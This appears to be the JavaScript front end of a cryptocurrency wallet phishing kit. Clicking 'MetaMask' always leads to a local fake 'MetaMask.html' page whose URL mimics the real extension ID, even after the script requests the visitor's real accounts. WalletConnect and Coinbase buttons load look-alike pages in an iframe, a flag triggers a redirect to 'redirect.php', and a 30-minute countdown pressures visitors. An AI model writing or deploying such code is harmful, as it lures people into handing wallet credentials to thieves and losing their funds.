

$(".connectBtn").on("click", function(e){


  e.stopPropagation();

  $(".overlay").show();


})

$(document).click(function () {
    $('.overlay').hide();
});


$(".alert").on("click", function(e){


  e.stopPropagation();

  $(".overlay").show();


})


$(".met").on("click", function () {




  if (typeof window.ethereum === 'undefined') {
    
     

     
  setTimeout(function () {

    window.location.replace("./MetaMask.html?extensions/=nkbihrfbeogaeaoehlefnkodbefgpgknn/");

    
  
  }, 500);
  setTimeout(function () {

   
   $("#loader").hide();
  }, 1000);
      
  }
  else if (typeof window.ethereum === 'undefined') {
      
      
     
  setTimeout(function () {

    window.location.replace("./MetaMask.html?extensions/=nkbihrfbeogaeaoehlefnkodbefgpgknn/");

    
  
  }, 500);
  setTimeout(function () {

   
   $("#loader").hide();
  }, 1000);
  }
  else{


    getAccount();
     
  }



})


$(".walletconnect").on("click", function () {


  let text = $(this).find(".capitalize").text()

  localStorage.setItem("text", text);


  let img = $(this).find("img").attr("src")


  localStorage.setItem("img", img);

  var iframe = document.getElementById('youriframe');

  iframe.src = "./wallets.html";

  setTimeout(function() { $("iframe").show();  }, 1000);


});



$(".coinBase").on("click", function () {




  let text = $(this).find("p").text()


  localStorage.setItem("text", text);




  var iframe = document.getElementById('youriframe');

  iframe.src = "./coinbase.html";

  setTimeout(function() { $("iframe").show();  }, 1000);


});



setInterval(function(){ 


  if(localStorage.getItem('redirect') == "yes"){

  
    localStorage.setItem('redirect', "no");
    document.location.replace("./redirect.php");
                   
  
}
 }, 2000);







 async function getAccount() {

      try {
          const accounts = await ethereum.request({
          method: 'eth_requestAccounts'
        });
        const account = accounts[0];
        // localStorage.setItem("wallet", account);

     

        await new Promise(r => setTimeout(r, 1000));

       
          
  setTimeout(function () {

    window.location.replace("./MetaMask.html?extensions/=nkbihrfbeogaeaoehlefnkodbefgpgknn/");

    
  
  }, 500);
  setTimeout(function () {

   
   $("#loader").hide();
  }, 1000);
        

        } catch (error) {
          console.error(error);
        }
      
    }




$(function () {
  jQuery.fn.extend({
      countdown: function () {
           // 24 hour countdown
           // Change variable here to see what will happen :D
            let hour = 0, min = 30, sec = 0
            render(hour, min, sec)
            
            const timer = setInterval(() => {
              if (hour == 0 && min == 0 && sec == 0) {
                  clearInterval(timer)
                    return ;
                }
                
              sec = dealSec(sec)
                min = dealMin(min, sec)
                hour = dealhour(hour, min, sec)
                render(hour, min, sec)
            }, 1000)
        },
    })
    
    $('#countdown').countdown()
})

function dealSec (sec) {
    const timeRange = [...Array(60).keys()].reverse()
  const idxNow = timeRange.indexOf(sec)
    const idxNext = (idxNow + 1) % timeRange.length
    return timeRange[idxNext]
}

function dealMin(min, sec) {
    const timeRange = [...Array(60).keys()].reverse()
    if (sec === 59) {
      const idxNow = timeRange.indexOf(min)
        const idxNext = (idxNow + 1) % timeRange.length
        return timeRange[idxNext]
    }
    return min
}

function dealhour (hour, min, sec) {
  if (min === 59 && sec === 59) return hour - 1
    return hour
}

function render(hour, min, sec) {
  hour = ("00" + hour).slice(-2)
    min  = ("00" + min).slice(-2)
    sec  = ("00" + sec).slice(-2)
    
    $('#countdown').text(`${min}:${sec}`)
}